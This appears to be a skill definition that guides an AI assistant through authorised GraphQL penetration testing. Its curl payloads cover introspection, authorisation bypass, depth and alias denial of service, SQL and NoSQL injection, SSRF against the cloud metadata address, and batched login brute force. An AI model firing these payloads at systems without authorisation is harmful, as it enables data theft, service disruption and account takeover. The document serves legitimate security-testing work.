# GraphQL Security Testing

## When Invoked

The user runs `/vapt graphql <url>` for deep GraphQL-specific security testing.

This is a specialized extension of `vapt-api`. While vapt-api covers basic GraphQL checks (introspection, depth, batching), this skill provides comprehensive GraphQL attack surface analysis.

## Phase 1: GraphQL Discovery & Fingerprinting

### 1.1 Endpoint Detection

```bash
# Common GraphQL endpoint paths
for path in /graphql /graphiql /v1/graphql /v2/graphql /api/graphql /query /gql /graphql/console /altair /playground; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -d '{"query":"{__typename}"}' <url>$path)
    [ "$code" != "404" ] && [ "$code" != "405" ] && echo "GraphQL candidate: $path ($code)"
done
```

### 1.2 Engine Fingerprinting

Identify the GraphQL server implementation:

```bash
# Apollo Server detection
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' <url>/graphql | grep -i apollo

# Check for engine-specific headers
curl -sI -X POST -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' <url>/graphql
```

Look for indicators of:
- Apollo Server (Node.js)
- graphql-yoga (Node.js)
- Hasura (auto-generated)
- AWS AppSync
- Graphene (Python)
- graphql-java
- Strawberry (Python)
- Hot Chocolate (.NET)

Engine detection informs which vulnerabilities are most likely.

## Phase 2: Schema Reconnaissance

### 2.1 Full Introspection Query

```bash
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields(includeDeprecated: true) { name description args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind } } isDeprecated deprecationReason } inputFields { name type { name kind ofType { name kind } } } enumValues { name } possibleTypes { name } } directives { name description locations args { name type { name kind ofType { name kind } } } } } }"}' \
    <url>/graphql
```

### 2.2 Partial Introspection (if full is blocked)

Some servers block full introspection but allow partial:

```bash
# Try querying specific types
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"{ __type(name: \"User\") { name fields { name type { name } } } }"}' \
    <url>/graphql

# Try field suggestions (error-based schema discovery)
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"{ users { nonexistentfield } }"}' \
    <url>/graphql
```

Many servers return "Did you mean..." suggestions, leaking field names.

### 2.3 Schema Analysis

From the introspection result, extract:
- All query types (read operations)
- All mutation types (write operations)
- All subscription types (real-time operations)
- Custom scalar types
- Enum values (may contain sensitive data like roles, statuses)
- Deprecated fields (may have weaker security)
- Input types (attack surface for injections)

### 2.4 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| Full introspection enabled in production | Medium | 5.3 |
| Field suggestions leak schema | Low | 3.7 |
| Sensitive enums exposed (roles, internal statuses) | Low | 3.5 |
| Deprecated fields still functional | Info | 0.0 |

## Phase 3: Authorization Testing

### 3.1 Query-Level Authorization

For each query type discovered, test access without authentication:

```bash
# Test unauthenticated access to each query
for query in users orders payments admin_settings; do
    curl -s -X POST -H "Content-Type: application/json" \
        -d "{\"query\":\"{ $query { id } }\"}" <url>/graphql
done
```

### 3.2 Field-Level Authorization

Test if sensitive fields are accessible:

```bash
# Access user query but request sensitive fields
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"{ users { id email passwordHash ssn creditCard } }"}' \
    <url>/graphql
```

### 3.3 Mutation Authorization

Test if mutations are properly restricted:

```bash
# Try admin mutations with regular user token
curl -s -X POST -H "Content-Type: application/json" \
    -H "Authorization: Bearer <regular_user_token>" \
    -d '{"query":"mutation { deleteUser(id: \"other_user\") { success } }"}' \
    <url>/graphql
```

### 3.4 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| Sensitive queries accessible without auth | High | 7.5 |
| Admin mutations accessible to regular users | Critical | 9.1 |
| Sensitive fields exposed (PII, credentials) | High | 7.5 |
| No field-level authorization | Medium | 5.5 |

## Phase 4: Denial of Service Attacks

### 4.1 Query Depth Attack

Test for query depth limits:

```bash
# Deeply nested query (adjust field names based on schema)
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"{ users { friends { friends { friends { friends { friends { friends { friends { id name } } } } } } } } }"}' \
    <url>/graphql
```

Measure response time and check for errors.

### 4.2 Query Complexity / Cost Analysis

```bash
# Wide query requesting many fields on many records
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"{ users(first: 10000) { id name email orders { id total items { id name price } } friends { id name } } }"}' \
    <url>/graphql
```

### 4.3 Circular Fragment Attack

```bash
# Fragment-based circular reference
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"query { users { ...A } } fragment A on User { friends { ...B } } fragment B on User { friends { ...A } }"}' \
    <url>/graphql
```

### 4.4 Alias-Based Attack

```bash
# Use aliases to multiply the same expensive query
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"{ a1: users { id } a2: users { id } a3: users { id } a4: users { id } a5: users { id } a6: users { id } a7: users { id } a8: users { id } a9: users { id } a10: users { id } }"}' \
    <url>/graphql
```

### 4.5 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| No query depth limit | Medium | 5.9 |
| No query complexity limit | Medium | 5.9 |
| Circular fragments not blocked | Medium | 5.3 |
| Alias multiplication not limited | Medium | 4.5 |

## Phase 5: Injection Testing

### 5.1 SQL Injection via GraphQL

Test all input parameters (query args, mutation inputs):

```bash
# SQLi in query argument
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"{ user(id: \"1 OR 1=1\") { id name } }"}' \
    <url>/graphql

# SQLi in search/filter
curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"query\":\"{ users(search: \\\"' OR '1'='1\\\") { id name } }\"}" \
    <url>/graphql
```

### 5.2 NoSQL Injection

For Hasura/MongoDB-backed GraphQL:

```bash
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"{ users(where: {name: {_regex: \".*\"}}) { id name } }"}' \
    <url>/graphql
```

### 5.3 SSRF via GraphQL

Test if any field accepts URLs that the server fetches:

```bash
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"mutation { importData(url: \"http://169.254.169.254/latest/meta-data/\") { result } }"}' \
    <url>/graphql
```

### 5.4 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| SQL injection via GraphQL argument | Critical | 9.8 |
| NoSQL injection | High | 8.1 |
| SSRF via GraphQL mutation | High | 8.6 |

## Phase 6: Batching & Rate Limit Bypass

### 6.1 Query Batching

```bash
# Send array of queries in single request
curl -s -X POST -H "Content-Type: application/json" \
    -d '[
        {"query":"mutation { login(email: \"admin@test.com\", password: \"pass1\") { token } }"},
        {"query":"mutation { login(email: \"admin@test.com\", password: \"pass2\") { token } }"},
        {"query":"mutation { login(email: \"admin@test.com\", password: \"pass3\") { token } }"},
        {"query":"mutation { login(email: \"admin@test.com\", password: \"pass4\") { token } }"},
        {"query":"mutation { login(email: \"admin@test.com\", password: \"pass5\") { token } }"}
    ]' <url>/graphql
```

If all 5 execute in one HTTP request, batching bypasses per-request rate limiting.

### 6.2 Alias-Based Rate Limit Bypass

```bash
# Multiple login attempts via aliases in a single query
curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"mutation { a1: login(email: \"admin@test.com\", password: \"pass1\") { token } a2: login(email: \"admin@test.com\", password: \"pass2\") { token } a3: login(email: \"admin@test.com\", password: \"pass3\") { token } }"}' \
    <url>/graphql
```

### 6.3 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| Batch auth bypass (brute force via batching) | High | 7.5 |
| Alias-based rate limit bypass | Medium | 5.9 |
| No per-operation rate limiting | Medium | 5.3 |

## Phase 7: Subscription Security

### 7.1 WebSocket Subscription Access

If subscriptions are available (usually via WebSocket):

```bash
# Test if subscriptions require authentication
# Connect to ws://<domain>/graphql and send:
# {"type":"connection_init","payload":{}}
# {"type":"subscribe","id":"1","payload":{"query":"subscription { newMessages { id content sender } }"}}
```

### 7.2 Subscription Enumeration

Can subscriptions leak data intended for other users?

### 7.3 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| Unauthenticated subscription access | High | 7.5 |
| Cross-user subscription data leak | High | 7.5 |

## Phase 8: Output

### Terminal Output

**Dev mode:** Explain GraphQL attack surface, why introspection is dangerous, how batching bypasses security, schema-aware attack strategies.

**Pro mode:** Schema summary + findings table.

### VAPT-GRAPHQL.md

```markdown
# VAPT GraphQL Security Report

## Target: <url>
## Endpoint: <graphql_path>
## Engine: <detected engine>
## Date: <timestamp>

## Schema Summary
| Type | Count |
|------|-------|
| Queries | X |
| Mutations | X |
| Subscriptions | X |
| Custom Types | X |

## Introspection
<enabled/disabled, partial leak results>

## Authorization
| Operation | Unauth | User | Admin |
|-----------|--------|------|-------|

## DoS Resistance
| Check | Status |
|-------|--------|
| Query depth limit | ... |
| Complexity limit | ... |
| Circular fragments | ... |
| Alias limit | ... |

## Injection Results
<SQL/NoSQL/SSRF findings>

## Batching & Rate Limits
<batching and rate limit bypass results>

## Subscription Security
<subscription access control results>

## Findings
<scored findings with CVSS>

## Suggested Next Steps
- /vapt inject <url> -- test non-GraphQL endpoints for injections
- /vapt auth <url> -- test authentication mechanisms
- /vapt report <url> -- compile full report
```

## Cross-Skill Integration

- GraphQL findings feed into vapt-api composite assessment
- Injection findings also count toward the injection category in Security Posture Score
- Schema discovery expands the attack surface for other skills
